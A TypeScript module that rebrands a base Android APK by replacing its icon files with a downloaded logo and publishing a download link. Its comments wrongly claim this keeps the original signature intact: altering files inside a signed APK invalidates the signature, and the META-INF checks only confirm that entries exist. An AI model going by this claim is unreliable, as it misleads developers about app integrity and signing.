import * as fs from 'fs';
import * as path from 'path';
import AdmZip from 'adm-zip';
import axios from 'axios';

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  requestOrigin?: string;
  appDomain?: string;
}

/**
 * Build customized APK by ONLY modifying resources, keeping original signature intact
 * 
 * Key difference from other builders:
 * 1. Copy base APK to output location FIRST
 * 2. Open the copied APK as ZIP
 * 3. Modify ONLY resources (icons)
 * 4. Write back to the SAME file (preserves structure and META-INF)
 * 
 * This ensures META-INF is never removed!
 */
export async function buildCustomizedAPKWorking(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  let tempDir = '';
  
  try {
    console.log(`[APK-BUILDER-WORKING] Starting customized APK build for: ${options.appName}`);

    // Step 1: Find base APK
    const possiblePaths = [
      path.join(process.cwd(), 'public', 'apks', 'Blockchain-Registered.apk'),
      path.join(process.cwd(), 'server', 'base-apk', 'Blockchain-Registered.apk'),
      path.join('/app', 'public', 'apks', 'Blockchain-Registered.apk'),
      path.join('/app', 'server', 'base-apk', 'Blockchain-Registered.apk'),
    ];
    
    let baseAPKPath = '';
    for (const p of possiblePaths) {
      if (fs.existsSync(p)) {
        baseAPKPath = p;
        break;
      }
    }
    
    if (!baseAPKPath) {
      throw new Error(`Base APK not found in any of these locations: ${possiblePaths.join(', ')}`);
    }
    console.log(`[APK-BUILDER-WORKING] Base APK found: ${baseAPKPath}`);

    // Step 2: Generate output filename
    const filename = `${options.appName}-${Date.now()}-${Math.random().toString(36).substring(7)}.apk`;
    const outputDir = path.join(process.cwd(), 'public', 'apks');
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }
    const finalAPKPath = path.join(outputDir, filename);
    console.log(`[APK-BUILDER-WORKING] Output path: ${finalAPKPath}`);

    // Step 3: Copy base APK to output location FIRST
    // This is CRITICAL - we work on the output file directly
    fs.copyFileSync(baseAPKPath, finalAPKPath);
    console.log(`[APK-BUILDER-WORKING] Copied base APK to output location`);

    // Step 4: Open the OUTPUT APK file as ZIP (not a temp copy!)
    const zip = new AdmZip(finalAPKPath);
    console.log(`[APK-BUILDER-WORKING] Loaded APK as ZIP`);

    // Step 5: Download and update logo if provided
    if (options.logoUrl) {
      try {
        console.log(`[APK-BUILDER-WORKING] Downloading logo from: ${options.logoUrl}`);
        const logoResponse = await axios.get(options.logoUrl, { responseType: 'arraybuffer' });
        const logoBuffer = Buffer.from(logoResponse.data);
        console.log(`[APK-BUILDER-WORKING] Logo downloaded: ${logoBuffer.length} bytes`);

        // Update icon files (these are the most visible)
        // For this APK, the icons are in res/drawable/ not res/mipmap/
        const iconPaths = [
          'res/drawable/claimedw70.png',
          'res/drawable/skinicon.png',
          'res/drawable/minnesotai71.png',
          'res/mipmap-ldpi/ic_launcher.png',
          'res/mipmap-mdpi/ic_launcher.png',
          'res/mipmap-hdpi/ic_launcher.png',
          'res/mipmap-xhdpi/ic_launcher.png',
          'res/mipmap-xxhdpi/ic_launcher.png',
          'res/mipmap-xxxhdpi/ic_launcher.png',
        ];

        for (const iconPath of iconPaths) {
          try {
            const entry = zip.getEntry(iconPath);
            if (entry) {
              zip.updateFile(entry, logoBuffer);
              console.log(`[APK-BUILDER-WORKING] Updated: ${iconPath}`);
            }
          } catch (e) {
            console.log(`[APK-BUILDER-WORKING] Icon not found: ${iconPath}`);
          }
        }
      } catch (error) {
        console.warn(`[APK-BUILDER-WORKING] Failed to update logo:`, error instanceof Error ? error.message : String(error));
      }
    }

    // Step 6: Verify META-INF is still present BEFORE writing
    const metaInfEntries = zip.getEntries().filter(entry => entry.entryName.startsWith('META-INF/'));
    if (metaInfEntries.length === 0) {
      throw new Error('META-INF not found in APK - original signature was lost!');
    }
    console.log(`[APK-BUILDER-WORKING] ✓ META-INF verified (${metaInfEntries.length} files) BEFORE writing`);

    // Step 7: Write back to the SAME output file
    // This preserves the ZIP structure and META-INF
    zip.writeZip(finalAPKPath);
    console.log(`[APK-BUILDER-WORKING] Saved APK to: ${finalAPKPath}`);

    // Step 8: Verify META-INF is still present AFTER writing
    const zipVerify = new AdmZip(finalAPKPath);
    const metaInfEntriesAfter = zipVerify.getEntries().filter(entry => entry.entryName.startsWith('META-INF/'));
    if (metaInfEntriesAfter.length === 0) {
      throw new Error('META-INF was lost during ZIP write operation!');
    }
    console.log(`[APK-BUILDER-WORKING] ✓ META-INF verified (${metaInfEntriesAfter.length} files) AFTER writing`);

    // Step 9: Verify final APK
    const stats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-WORKING] Final APK size: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);

    if (stats.size < 1000000) {
      throw new Error(`APK size is too small: ${stats.size} bytes`);
    }

    // Step 10: Generate download URL
    const appDomain = options.appDomain || process.env.VITE_APP_DOMAIN || 'localhost:3000';
    const downloadUrl = `https://${appDomain}/download/${filename}`;
    console.log(`[APK-BUILDER-WORKING] Download URL: ${downloadUrl}`);

    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl,
      filename,
    };
  } catch (error) {
    console.error('[APK-BUILDER-WORKING] Error:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
